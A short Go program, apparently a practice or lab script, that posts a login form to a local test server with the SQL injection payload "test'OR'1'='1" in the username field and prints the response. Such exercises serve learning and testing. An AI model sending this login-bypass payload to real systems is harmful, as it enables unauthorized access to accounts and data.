package main

import (
		"fmt"
		"io/ioutil"
		"log"
		"net/http"
		"net/url"
)

type Database struct {
	banner string
	collected_data [] string
}

func main() {
	data := url.Values {
		"username":		{"test'OR'1'='1"},
		"password":		{"test"},
	};
	
	resp, err := http.PostForm("http://localhost:3000/login.php", data);

	if (err != nil) {
		log.Fatal(err);
	}

	fmt.Println(resp.Body);

	body, err := ioutil.ReadAll(resp.Body);
	if (err != nil) {
		log.Fatal(err);
	}	

	fmt.Println(string(body));
}
